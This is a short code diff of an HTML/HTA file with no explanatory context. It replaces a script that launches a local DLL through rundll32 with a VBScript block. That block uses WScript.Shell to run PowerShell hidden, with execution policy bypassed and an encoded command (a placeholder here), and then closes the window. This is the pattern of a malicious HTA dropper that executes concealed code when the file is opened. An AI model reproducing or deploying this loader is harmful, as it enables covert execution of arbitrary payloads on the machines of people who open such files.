@@ -1,20 +1,9 @@
 <html>
 <head>
-<hta:application />
-<script>
-var shell = new ActiveXObject("WScript.Shell");
-
-
-shell.Run(
-  'rundll32.exe "D:\\PYTHON\\C\\dll\\mydll.dll",RunMyApp'
-);
-
-//window.close();
-
- alert("HY JS !!!");
-    close();
+<script language="VBScript">
+    Set objShell = CreateObject("WScript.Shell")
+    objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand <BASE64_COMMAND>"
+    window.close()
 </script>
 </head>
-<body>
-</body>
 </html>
